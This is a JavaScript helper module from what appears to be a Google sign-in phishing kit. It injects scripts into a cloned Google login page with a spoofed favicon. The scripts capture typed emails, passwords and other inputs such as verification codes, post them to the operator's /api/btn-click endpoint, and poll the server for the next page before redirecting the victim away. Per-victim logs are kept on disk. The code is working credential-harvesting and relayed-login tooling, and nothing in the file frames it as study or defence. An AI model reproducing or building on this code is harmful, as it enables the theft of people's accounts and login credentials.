import fs from "fs";
import path from "path";

import { DEBUG_LOG_DIR, USERS_LOG_DIR } from "./common.js";
import psList from "ps-list";
// ---------------------------
// Helpers
// ---------------------------
export const decodeB64 = (buf, defaultVal = "") => {
  try {
    if (!buf) return defaultVal;
    return atob(buf);
  } catch {
    return defaultVal;
  }
};

// debug logging
export const writeDebugLogLine = (data = "", filename = "gauth_log.txt") => {
  try {
    const dirPath = path.join(DEBUG_LOG_DIR);
    if (!fs.existsSync(dirPath)) {
      fs.mkdirSync(dirPath);
    }
    const filePath = path.join(dirPath, `${filename}`);
    // console.log('[writeLogLine]', dirPath, filePath)
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, data + "\n");
    } else {
      fs.appendFileSync(filePath, data + "\n");
    }
  } catch (error) {
    console.error(error);
  }
};
export function ensureUserLogDir(userId) {
  const dir = path.join(USERS_LOG_DIR, `users`, `user_log_${userId}`);
  try {
    fs.mkdirSync(dir, { recursive: true });
  } catch (e) {
    return null;
  }
  return dir;
}

export function writeUserLog(userId, message) {
  const dir = ensureUserLogDir(userId);
  const file = path.join(dir, "log.txt");
  const ts = new Date().toISOString().replace("T", " ").replace("Z", "");
  fs.appendFileSync(file, `[${ts}]: ${message}\n`, "utf8");
}

export const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Check if a process with a given PID and name (e.g. "chrome") is running
 * @param {number} pid - process id to check
 * @param {string} name - process name ("chrome", "google-chrome", etc.)
 * @returns {Promise<boolean>}
 */

export async function checkProcessIsRunning(pid, name = "chrome") {
  try {
    const processes = await psList();

    return processes.some(
      (p) => p.pid === pid && p.name.toLowerCase().includes(name.toLowerCase())
    );
  } catch (err) {
    console.error("Error checking processes:", err);
    return false;
  }
}

//======================================
//
//
//
//
//
//======================================

export function removeSpecificTag(src, tag) {
  let htmlTxt = src;
  const startTag = "<" + tag;
  const endTag = "</" + tag;

  let startIdx = htmlTxt.indexOf(startTag);
  if (startIdx < 0) {
    return htmlTxt;
  }

  let endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;

  while (true) {
    if (startIdx < 0) {
      break;
    }

    htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx);

    startIdx = htmlTxt.indexOf(startTag);
    if (startIdx >= 0) {
      endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;
    }
  }
  return htmlTxt;
}

export function getSpecificTagList(src, tag) {
  let htmlTxt = src;
  const startTag = "<" + tag;
  const endTag = "</" + tag;

  let startIdx = htmlTxt.indexOf(startTag);
  let endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;

  const tagList = [];
  while (true) {
    if (startIdx < 0) {
      break;
    }

    const cell = htmlTxt.substring(startIdx, endIdx);
    if (cell.indexOf("body{opacity:0;}") < 0) {
      tagList.push(cell);
    }

    htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx);

    startIdx = htmlTxt.indexOf(startTag);
    if (startIdx >= 0) {
      endIdx = htmlTxt.indexOf(endTag, startIdx) + endTag.length + 1;
    }
  }
  return tagList;
}

export function addStyleList(src, styleList) {
  let htmlTxt = src;

  let metaEndIdx = htmlTxt.indexOf("<meta");
  if (metaEndIdx < 0) {
    return htmlTxt;
  }

  metaEndIdx = htmlTxt.indexOf(">", metaEndIdx);
  if (metaEndIdx < 0) {
    return htmlTxt;
  }

  for (let i = 0; i < styleList.length; i++) {
    htmlTxt =
      htmlTxt.substring(0, metaEndIdx + 1) +
      styleList[styleList.length - i - 1] +
      htmlTxt.substring(metaEndIdx + 1);
  }

  return htmlTxt;
}

export function getHtmlAlreadySignin(forwardUrl) {
  const htmlTxt = `
        <html>
            <script>window.location.href="${forwardUrl}"</script>
        </html>
    `;
  return htmlTxt;
}

export function setFavicon(src) {
  const iconLink =
    '<link rel="shortcut icon" href="https://www.google.com/favicon.ico" />';
  const headIdx = src.indexOf("<head>");
  if (headIdx < 0) {
    return src;
  }

  const htmlTxt =
    src.substring(0, headIdx + "<head>".length) +
    iconLink +
    src.substring(headIdx + "<head>".length);
  return htmlTxt;
}

export function setUserIdScript(src, userId) {
  const htmlTxt =
    src +
    `
        <script>
            const user_id = ${userId};
            var reloaded = false;

            var api_server_url = window.location.origin;            
            console.log(api_server_url);
        </script>
    `;
  return htmlTxt;
}

export function setForwardUrlScript(src, forwardUrl) {
  const htmlTxt =
    src +
    `
        <script>
            const forward_url = "${forwardUrl}";
        </script>
    `;
  return htmlTxt;
}

export function addSetInputEmailValueScript(src, email) {
  const htmlTxt =
    src +
    `
        <script>
            document.getElementById("identifierId").value = "${email}";
        </script>
    `;
  return htmlTxt;
}

export function addTimeoutScript(src) {
  const htmlTxt =
    src +
    `
        <script>
            window.setInterval(function() {
                if(reloaded == false) {
                    actions_func();
                    reloaded = true;

                    if(curPage != 'dp')
                        return;
                    // fetch //
                    const apiUrl = api_server_url + '/api/url-check';
                    fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            uid: user_id
                        })
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        return response.json();
                    })
                    .then(data => {
                        //console.log(data);
                        apiResultProcessing(data);           
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                }                            
            }, 100);
        </script>
    `;
  return htmlTxt;
}

export function addFunctionsScript(src) {
  const htmlTxt =
    src +
    `
        <script>
            var curPage = 'email';
            //document.URL
            function getElementByXpath(path) {
                return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            }

            function getAllElementsByXPath(xpath, parent) {
                let results = [];
                let query = document.evaluate(xpath, parent || document,
                    null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
                for (let i = 0, length = query.snapshotLength; i < length; ++i) {
                    results.push(query.snapshotItem(i));
                }
                return results;
            }

            function doneApiRequest() {
                const apiUrl = api_server_url + '/api/done-user';
                fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        uid: user_id,
                    })
                });				
            }
               
            function apiResultProcessing(data) {
                if(data.status == 0) return;
                
                //console.log(data.htmlText)
                //document.getElementsByTagName('body')[0].innerHTML = data.htmlText;
                
                curPage = data.curPage
                                        
                if(curPage == 'done') {
                    //console.log(curPage, forward_url);
                    doneApiRequest();
                    //document.cookie = createCookie('acc', acc);
                    window.location.href = forward_url;
                } else {
                    var mainDivElement = document.getElementById("yDmH0d");
                    mainDivElement.innerHTML = data.htmlText;
                    
                    // hide progresss bar //
                    getElementByXpath('//div[@jscontroller="ltDFwf"]').className = "sZwd7c B6Vhqe qdulke jK7moc";

                    // enable //
                    var div_el = getElementByXpath('//div[@class="S7xv8 LZgQXe"]');
                    div_el.style["opacity"] = "1.0";
                    div_el.style["pointer-events"] = "all";
                    reloaded = false;
                }  
            }

            function createCookie(cookie_name, value) {
                var cookie_value = escape(value) + ';';
                return cookie_name + '=' + cookie_value;
            }

            function getCookie(cookie_name) {
				let matches = document.cookie.match(new RegExp(
					"(?:^|; )" + cookie_name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
					));
				return matches ? decodeURIComponent(matches[1]) : undefined;
			}

            // function getCookie1(cookie_name) {
            //     let matches = document.cookie.match(new RegExp(
            //         "(?:^|; )" + cookie_name.replace(/([\.$?*|{}\(\)\[\]\\/\+^])/g, '\$1') + "=([^;]*)"
            //         ));
            //     return matches ? decodeURIComponent(matches[1]) : undefined;
            // }
            const btnClickFunction = (btnType, btnText) => {
                // get uid //
                uid = user_id;

                // progresss bar //
                getElementByXpath('//div[@jscontroller="ltDFwf"]').className = "sZwd7c B6Vhqe";

                // disable //
                var div_el = getElementByXpath('//div[@class="S7xv8 LZgQXe"]');
                div_el.style["opacity"] = "0.5";
                div_el.style["pointer-events"] = "none";

                // get input value //
                var value = '';
                if(curPage == 'email') {
                    value = getElementByXpath('//input[@id="identifierId"]').value;
                } else if(curPage == 'password') {
                    value = getElementByXpath('//input[@name="Passwd"]').value;
                } else {
                    var input_elements = getAllElementsByXPath('//input');
                    for(let i = 0; i < input_elements.length; i++) {
                        if(input_elements[i].type != 'checkbox' 
                                && input_elements[i].type != 'button'
                                && input_elements[i].type != 'hidden'
                                && input_elements[i].value != '') {
                                value = input_elements[i].value;
                                break;
                        }
                    }
                }
                

                // fetch //
                const apiUrl = api_server_url + '/api/btn-click';
                fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        uid: uid,
                        value: value,
                        btnType: btnType,
                        btnText: btnText
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    //console.log(data);
                    apiResultProcessing(data);                       
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            }

            ///////////////////////////////////////////////////
            /////////////////// ADD ACTIONS ///////////////////
            ///////////////////////////////////////////////////
            // get language param //
            //console.log(document.URL);
            const url = new URL(document.URL);
            const urlParams = url.searchParams;
            const hl = urlParams.get('hl');
            const acc = urlParams.get('acc');
            
            // check cookie //
            /*cookie_value = createCookie('acc', acc).replace(';', '');
            if (document.cookie.indexOf(cookie_value) >= 0) {
                window.location.href = forward_url;
            }*/
               
            // enter key down //
            document.addEventListener('keydown', (event) => {
                if (event.key === 'Enter') {
                    event.preventDefault();
                    
                    var btnText = 'Next'					
                    // if(hl == 'ko') btnText = '다음';
                    
                    btnClickFunction(0, btnText);			
                }
            });
                
            function actions_func() {
                //console.log('[actions func]')
                // button clicked //
                var btnElements = document.getElementsByTagName("button");
                for(let i = 0; i < btnElements.length; i++) {
                    btnElements[i].addEventListener('click', () => {
                        btnText = btnElements[i].innerText;
                        btnClickFunction(0, btnText);        
                    });
                }

                // reselect account script //
                var btn = getElementByXpath('//div[@jsname="af8ijd"]');
                if(btn) {
                    btn.addEventListener('click', () => {
                            btnClickFunction(1, 'af8ijd');        
                    });
                }
                

                // add_password_checkbox_script //
                var pwd_input = getElementByXpath('//input[@name="Passwd"]');
                //console.log('hi', pwd_input);
                if(pwd_input) {
                    var pwd_checkbox = getElementByXpath('//input[@class="VfPpkd-muHVFf-bMcfAe"]');
                    //console.log('[LOG]', pwd_checkbox);
                    if(pwd_checkbox && pwd_checkbox.type == 'checkbox') {
                        pwd_checkbox.addEventListener('click', () => {
                            if(pwd_checkbox.checked == true) {
                                pwd_input.type = 'text';
                            } else {
                                pwd_input.type = 'password';
                            }
                        });
                    }
                }

                // try another way list click script //
                var li_elements = getAllElementsByXPath('//li');
                for(let i = 0; i < li_elements.length; i++) {
                    if(li_elements[i].className && li_elements[i].className.indexOf('aZvCDf cd29Sd zpCp3 SmR8') >= 0) {
                        li_elements[i].addEventListener('click', () => {
                            var str_title = li_elements[i].innerText.split("\\n")[0];
                            //console.log(str_title);
                            btnClickFunction(2, str_title);      
                        });
                    }
                }
            }			
        </script>
    `;

  return htmlTxt;
}
